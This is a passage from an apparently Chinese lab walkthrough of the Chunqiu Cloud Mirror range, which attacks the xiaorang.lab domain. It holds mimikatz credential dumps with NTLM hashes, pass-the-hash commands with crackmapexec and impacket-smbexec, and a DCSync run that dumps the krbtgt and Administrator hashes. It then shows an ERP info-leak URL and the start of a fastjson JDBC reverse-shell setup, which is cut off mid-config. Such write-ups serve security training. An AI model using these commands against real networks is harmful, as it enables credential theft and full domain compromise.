+</span></span><span class="line"><span class="cl">	 * Password : d5 c1 9f <span class="m">33</span> <span class="m">00</span> 1b 0c 8e 9d 6e <span class="m">81</span> 7a 7e ca ce df f6 9c <span class="m">13</span> 5a f0 ff b9 <span class="m">95</span> b5 e4 <span class="m">01</span> <span class="m">74</span> e2 b6 <span class="m">56</span> <span class="m">57</span> <span class="nb">fc</span> <span class="m">74</span> <span class="nb">fc</span> <span class="m">22</span> <span class="m">54</span> ca f8 ed <span class="m">29</span> 2f 1b d7 <span class="m">71</span> ff <span class="m">39</span> 8c ff <span class="m">29</span> d8 a2 <span class="m">05</span> dd b1 <span class="m">95</span> <span class="m">70</span> 4c <span class="m">70</span> 7b fa e0 <span class="m">57</span> c7 <span class="m">89</span> aa c0 <span class="m">80</span> e8 <span class="m">14</span> f0 <span class="m">54</span> e4 <span class="m">61</span> <span class="m">25</span> 3b <span class="m">87</span> c0 de <span class="m">72</span> cf <span class="m">31</span> d2 1c d1 3d <span class="m">56</span> e3 a4 a4 d4 <span class="m">69</span> d5 6d <span class="m">95</span> e9 <span class="m">55</span> ef fd b5 <span class="m">81</span> de b3 <span class="m">39</span> <span class="m">96</span> 3c 2a f5 cc d9 c1 <span class="m">25</span> <span class="m">97</span> <span class="m">33</span> <span class="m">48</span> <span class="m">53</span> f2 9b <span class="m">60</span> 7c e1 b2 <span class="m">62</span> <span class="m">76</span> 6d c9 c8 <span class="m">02</span> d4 aa bc bf <span class="m">80</span> 1c <span class="m">72</span> <span class="m">45</span> f4 <span class="m">23</span> fa 0a d1 <span class="m">39</span> b7 <span class="m">18</span> ca b5 6a ca a6 <span class="m">49</span> <span class="m">44</span> c0 <span class="m">91</span> <span class="m">64</span> <span class="m">13</span> 0a 7c 3a <span class="m">95</span> 0d c2 a1 a1 1b <span class="m">47</span> ef ce <span class="m">12</span> <span class="m">58</span> e8 <span class="m">02</span> <span class="m">26</span> <span class="m">30</span> 1a <span class="nb">fc</span> <span class="m">05</span> <span class="m">72</span> 0f cc 1f <span class="m">09</span> <span class="m">19</span> 1a <span class="m">27</span> <span class="m">46</span> <span class="m">06</span> <span class="m">56</span> <span class="m">57</span> <span class="m">05</span> d2 6a ad <span class="m">89</span> 9a a5 b0 f3 fb <span class="m">93</span> <span class="m">40</span> <span class="m">98</span> <span class="m">82</span> ba <span class="m">09</span> <span class="m">96</span> <span class="m">66</span> 1d <span class="m">80</span> 3f a1 fb <span class="m">23</span> e3 <span class="m">90</span> e8 <span class="m">85</span> 8f <span class="m">86</span> 5b fe e6 7d 9a f3 f0 <span class="m">27</span> b7 b5 <span class="m">57</span> 0a <span class="m">98</span> 0c fd a5 f3 ae <span class="m">97</span> <span class="m">74</span> <span class="m">14</span> 1d 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">21915646</span> <span class="o">(</span>00000000:014e67fe<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : RemoteInteractive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : Aldrich
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : DC01
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 16:13:58
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : Aldrich
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 630aa5e88c0b382c5dfdd935965aa343
+</span></span><span class="line"><span class="cl">	 * SHA1     : 49ffb25f942060cf13ec4fcfa94f040b7306e587
+</span></span><span class="line"><span class="cl">	 * DPAPI    : e58d6469c288dc84f471b6c317166924
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : Aldrich
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : Aldrich
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG.LAB
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">15426231</span> <span class="o">(</span>00000000:00eb62b7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : DefaultAppPool
+</span></span><span class="line"><span class="cl">Domain            : IIS APPPOOL
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 14:56:54
+</span></span><span class="line"><span class="cl">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 8f2e9a48501c4ce8574981f323786bfa
+</span></span><span class="line"><span class="cl">	 * SHA1     : ed82695e1805d58b8441f78dbaeb97dc60002772
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">	 * Password : d5 c1 9f <span class="m">33</span> <span class="m">00</span> 1b 0c 8e 9d 6e <span class="m">81</span> 7a 7e ca ce df f6 9c <span class="m">13</span> 5a f0 ff b9 <span class="m">95</span> b5 e4 <span class="m">01</span> <span class="m">74</span> e2 b6 <span class="m">56</span> <span class="m">57</span> <span class="nb">fc</span> <span class="m">74</span> <span class="nb">fc</span> <span class="m">22</span> <span class="m">54</span> ca f8 ed <span class="m">29</span> 2f 1b d7 <span class="m">71</span> ff <span class="m">39</span> 8c ff <span class="m">29</span> d8 a2 <span class="m">05</span> dd b1 <span class="m">95</span> <span class="m">70</span> 4c <span class="m">70</span> 7b fa e0 <span class="m">57</span> c7 <span class="m">89</span> aa c0 <span class="m">80</span> e8 <span class="m">14</span> f0 <span class="m">54</span> e4 <span class="m">61</span> <span class="m">25</span> 3b <span class="m">87</span> c0 de <span class="m">72</span> cf <span class="m">31</span> d2 1c d1 3d <span class="m">56</span> e3 a4 a4 d4 <span class="m">69</span> d5 6d <span class="m">95</span> e9 <span class="m">55</span> ef fd b5 <span class="m">81</span> de b3 <span class="m">39</span> <span class="m">96</span> 3c 2a f5 cc d9 c1 <span class="m">25</span> <span class="m">97</span> <span class="m">33</span> <span class="m">48</span> <span class="m">53</span> f2 9b <span class="m">60</span> 7c e1 b2 <span class="m">62</span> <span class="m">76</span> 6d c9 c8 <span class="m">02</span> d4 aa bc bf <span class="m">80</span> 1c <span class="m">72</span> <span class="m">45</span> f4 <span class="m">23</span> fa 0a d1 <span class="m">39</span> b7 <span class="m">18</span> ca b5 6a ca a6 <span class="m">49</span> <span class="m">44</span> c0 <span class="m">91</span> <span class="m">64</span> <span class="m">13</span> 0a 7c 3a <span class="m">95</span> 0d c2 a1 a1 1b <span class="m">47</span> ef ce <span class="m">12</span> <span class="m">58</span> e8 <span class="m">02</span> <span class="m">26</span> <span class="m">30</span> 1a <span class="nb">fc</span> <span class="m">05</span> <span class="m">72</span> 0f cc 1f <span class="m">09</span> <span class="m">19</span> 1a <span class="m">27</span> <span class="m">46</span> <span class="m">06</span> <span class="m">56</span> <span class="m">57</span> <span class="m">05</span> d2 6a ad <span class="m">89</span> 9a a5 b0 f3 fb <span class="m">93</span> <span class="m">40</span> <span class="m">98</span> <span class="m">82</span> ba <span class="m">09</span> <span class="m">96</span> <span class="m">66</span> 1d <span class="m">80</span> 3f a1 fb <span class="m">23</span> e3 <span class="m">90</span> e8 <span class="m">85</span> 8f <span class="m">86</span> 5b fe e6 7d 9a f3 f0 <span class="m">27</span> b7 b5 <span class="m">57</span> 0a <span class="m">98</span> 0c fd a5 f3 ae <span class="m">97</span> <span class="m">74</span> <span class="m">14</span> 1d 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">995</span> <span class="o">(</span>00000000:000003e3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : IUSR
+</span></span><span class="line"><span class="cl">Domain            : NT AUTHORITY
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:32
+</span></span><span class="line"><span class="cl">SID               : S-1-5-17
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	 * Domain   : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">997</span> <span class="o">(</span>00000000:000003e5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : LOCAL SERVICE
+</span></span><span class="line"><span class="cl">Domain            : NT AUTHORITY
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-19
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	 * Domain   : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	 * Domain   : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">55356</span> <span class="o">(</span>00000000:0000d83c<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-1
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-1
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a
+</span></span><span class="line"><span class="cl">	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">	 * Password : 9e ae c4 7a ed ee <span class="m">91</span> <span class="m">74</span> a5 <span class="m">59</span> <span class="m">61</span> a5 <span class="m">00</span> 2c c5 <span class="m">00</span> <span class="m">60</span> 3b <span class="m">87</span> <span class="m">48</span> d0 <span class="m">17</span> <span class="m">48</span> cf df 7b <span class="m">14</span> af 9a <span class="m">99</span> <span class="m">22</span> b5 <span class="m">94</span> ba 0a 1e f0 6e f0 <span class="m">25</span> b1 e2 a2 <span class="m">62</span> fb b8 <span class="m">68</span> <span class="m">93</span> <span class="m">42</span> <span class="m">64</span> <span class="m">08</span> b7 f6 2e f7 cf ae a3 7a <span class="m">94</span> 9d <span class="m">32</span> <span class="m">24</span> 1a b1 6b <span class="m">87</span> 6c 5e f1 d3 <span class="m">89</span> c6 c4 8b d3 bd <span class="m">05</span> 9c b0 e1 <span class="m">85</span> d4 2c <span class="m">03</span> <span class="m">56</span> 5f af <span class="m">09</span> <span class="m">15</span> <span class="m">12</span> <span class="m">10</span> df <span class="m">74</span> e7 4c d3 <span class="m">65</span> <span class="m">55</span> d8 ab bd b4 <span class="m">71</span> 5c 8c a7 bd <span class="m">14</span> <span class="m">60</span> 8b <span class="m">44</span> b5 d8 d8 <span class="m">61</span> <span class="m">23</span> f1 4f 4d 8e a0 dc ac 8a <span class="m">60</span> <span class="m">15</span> 0d f7 9f a1 <span class="m">85</span> <span class="m">98</span> c4 cf <span class="m">34</span> ec ee ea c5 b9 5b <span class="m">42</span> 8b <span class="m">97</span> cc 4d ed 1f db 8c b4 <span class="m">45</span> <span class="m">06</span> ce <span class="m">40</span> <span class="nb">fc</span> <span class="m">81</span> <span class="m">96</span> ac c3 <span class="m">61</span> e5 e9 <span class="m">42</span> <span class="m">90</span> <span class="m">69</span> f3 b2 <span class="m">85</span> fa <span class="m">80</span> <span class="m">59</span> e2 8b a5 f6 <span class="m">70</span> 5d 1a bd 5f b1 <span class="m">85</span> 6b ae b0 <span class="m">16</span> <span class="m">42</span> <span class="m">29</span> 2c <span class="m">99</span> <span class="m">57</span> fb <span class="m">49</span> ea e3 <span class="m">29</span> <span class="m">49</span> <span class="m">56</span> <span class="m">55</span> 6c 9a 2b ee <span class="m">13</span> <span class="m">77</span> fe d7 a3 <span class="m">51</span> b8 <span class="m">01</span> ec bb <span class="m">60</span> <span class="m">22</span> b8 7c 2f f5 6b 0f 6b <span class="m">87</span> <span class="m">36</span> <span class="m">76</span> <span class="m">45</span> <span class="m">81</span> 7e e3 <span class="m">71</span> 0a a8 ca 2a a3 a6 <span class="m">05</span> <span class="m">64</span> 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">25381</span> <span class="o">(</span>00000000:00006325<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : UndefinedLogonType from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Domain            : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:28
+</span></span><span class="line"><span class="cl">SID               : 
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 8f2e9a48501c4ce8574981f323786bfa
+</span></span><span class="line"><span class="cl">	 * SHA1     : ed82695e1805d58b8441f78dbaeb97dc60002772
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">999</span> <span class="o">(</span>00000000:000003e7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : UndefinedLogonType from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : WIN2016$
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:28
+</span></span><span class="line"><span class="cl">SID               : S-1-5-18
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : win2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG.LAB
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到这里的NTLM凭证，直接用<code>crackmapexec</code>命令执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.8.15 -u <span class="s1">&#39;WIN2016$&#39;</span> -H 8f2e9a48501c4ce8574981f323786bfa -d xiaorang -x <span class="s2">&#34;type C:\Users\Administrator\flag\flag03.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311171301354.png"
+	width="1292"
+	height="429"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311171301354_hu3055167138918953641.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311171301354_hu18168020242650522629.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311171301354"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="722px"
+	
+></p>
+<p>或者上传mimikatz dump出其他用户的hash再命令执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell C:<span class="se">\\</span>Users<span class="se">\\</span>Public<span class="se">\\</span>mimikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后是dump dcsync</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>05/26 18:58:21<span class="o">]</span> <span class="o">[</span>*<span class="o">]</span> Tasked beacon to run: C:<span class="se">\\</span>Users<span class="se">\\</span>Public<span class="se">\\</span>mimikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>05/26 18:58:21<span class="o">]</span> <span class="o">[</span>+<span class="o">]</span> host called home, sent: <span class="m">137</span> bytes
+</span></span><span class="line"><span class="cl"><span class="o">[</span>05/26 18:58:22<span class="o">]</span> <span class="o">[</span>+<span class="o">]</span> received output:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c1">#19041 Sep 19 2022 17:44:08</span>
+</span></span><span class="line"><span class="cl"> .## ^ <span class="c1">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;#####&#39;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c1"># privilege::debug</span>
+</span></span><span class="line"><span class="cl">Privilege <span class="s1">&#39;20&#39;</span> OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c1"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;xiaorang.lab&#39;</span> will be the domain
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;DC01.xiaorang.lab&#39;</span> will be the DC server
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> Exporting domain <span class="s1">&#39;xiaorang.lab&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> Service  : ldap
+</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> AuthnSvc : GSS_NEGOTIATE <span class="o">(</span>9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">502	krbtgt	3ffd5b58b4a6328659a606c3ea6f9b63	<span class="m">514</span>
+</span></span><span class="line"><span class="cl">1000	DC01$	f96c2590d6a79fcb1ef4238ade63a071	<span class="m">532480</span>
+</span></span><span class="line"><span class="cl">500	Administrator	2c9d81bdcf3ec8b1def10328a7cc2f08	<span class="m">512</span>
+</span></span><span class="line"><span class="cl">1103	WIN2016$	6e3b4351775ddedcfee0c3632f9747c4	<span class="m">16781312</span>
+</span></span><span class="line"><span class="cl">1104	WIN19-CLIENT$	e2f7b9fef4b865cf2f721d512ad3c35a	<span class="m">16781312</span>
+</span></span><span class="line"><span class="cl">1105	Aldrich	161cff084477fe596a5db81874498a24	<span class="m">512</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c1"># exit</span>
+</span></span><span class="line"><span class="cl">Bye!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到Administrator的hash,拿shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="exchange">Exchange
+</h2><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312200311280.png"
+	width="1483"
+	height="762"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312200311280_hu6384133337460357086.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312200311280_hu15773554005735238434.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312200311280"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>fscan扫到8000端口有华夏erp,可以打CNVD-2020-63964有信息泄露</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://39.99.229.189:8000//user/getAllList;.ico
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312200620853.png"
+	width="774"
+	height="377"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312200620853_hu3355633506735830734.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312200620853_hu6335322572093341224.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312200620853"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="492px"
+	
+></p>
+<p>密码是123456，不过登入没啥用，这个版本还存在fastjson1.2.55 jdbc的rce漏洞，nday直接跟着打</p>
+<p>准备ysoserial的jar包和<a class="link" href="https://github.com/fnmsd/MySQL_Fake_Server"  target="_blank" rel="noopener"
+    >mysql_fake_server</a>在服务器上起恶意mysql服务打jdbc</p>
+<p>需要改一下config.json,其实就是在最后加上cc6的反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;config&#34;</span><span class="p">:{</span>
